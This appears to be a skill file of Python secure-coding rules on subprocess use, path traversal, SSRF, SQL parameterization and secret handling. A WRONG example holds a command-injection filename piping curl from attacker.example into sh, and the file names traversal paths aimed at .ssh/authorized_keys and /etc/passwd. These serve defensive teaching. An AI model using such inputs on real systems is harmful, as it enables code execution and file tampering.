---
name: python-security
description: >-
  Python security practice for input from outside the process: cryptographically secure randomness
  for capability-bearing values, TLS verification left on, adaptive password hashing and
  constant-time comparison, parameterized SQL including order-by and table names, subprocess
  argument lists rather than shell strings, safe parsers, path-traversal containment, SSRF
  allowlists revalidated across redirects, bounded input sizes, secret handling, and failing
  closed. Use when Python code handles a request body, a filename, a URL, a subprocess argument, a
  credential, an upload or any untrusted payload.
---

# Security

- **Cryptographically secure randomness for anything capability-bearing** — tokens, salts, nonces,
  ids. Never a general-purpose random generator.
- **TLS verification stays on.** Never disable it "to make it work"; if a certificate is genuinely
  private, supply the CA bundle.
- **Passwords are hashed with a vetted adaptive algorithm**, never a fast hash and never a
  hand-rolled scheme. Secrets are compared in constant time, never with `==`.
- **Dependencies are scanned for known vulnerabilities**, and a finding blocks the upgrade path it
  came in on.
- **SQL is always parameterized** — including order-by clauses and table names, which are chosen
  from a whitelist of constants, never interpolated. Annotating the query parameter
  `LiteralString` lets pyright reject an interpolated query; mypy treats it as plain `str` and
  does not, so under mypy this rule rests on review.
- **Subprocesses take an argument list, never a shell string.** Executable paths and arguments are
  validated, not concatenated from input.

```python
# WRONG — a filename such as "x; curl attacker.example | sh" is a second command
subprocess.run(f"gzip --keep {filename}", shell=True, check=True, timeout=_GZIP_TIMEOUT_SECONDS)

# CORRECT — one argument per item, and "--" stops a name such as "-r" being read as an option
subprocess.run(["gzip", "--keep", "--", filename], check=True, timeout=_GZIP_TIMEOUT_SECONDS)
```

- **Parse untrusted formats defensively**: safe loaders only, hardened XML, and no evaluation of
  untrusted input.
- **Path traversal**: any path derived from external input is resolved and checked to be contained
  within its base. Filenames from users are data — a sanitized display name plus a generated
  storage name, never used raw. The archive-extraction variant is the classic one: an entry named
  `../../.ssh/authorized_keys` writes wherever it points.

```python
# WRONG — "../../etc/passwd" still starts with the root string, and so does "/srv/uploads-old"
path = upload_root / filename
if not str(path).startswith(str(upload_root)):
    raise UnsafePathError(filename)

# CORRECT — resolve ".." and symlinks first, then compare path components, not characters
path = (upload_root / filename).resolve()
if not path.is_relative_to(upload_root.resolve()):
    raise UnsafePathError(filename)
```

- **Server-side request forgery**: URLs from users are validated against an allowlist of schemes
  and hosts before fetching; redirects are re-validated, because the allowlist you checked before
  the request is worthless otherwise; internal metadata ranges and loopback are blocked by default.
- **Every external input is bounded**: body size limits, pagination caps, collection length limits,
  decompression ratio limits. Validation includes *size*, not just shape.
- **Secrets come from the environment or a secret manager**, wrapped in a type that does not render
  them, never committed, and never present in URLs, logs or error messages.
- **Fail closed**: authorization lives in the service layer, not only at the transport edge; it
  denies by default, and an error inside the check denies rather than allows.
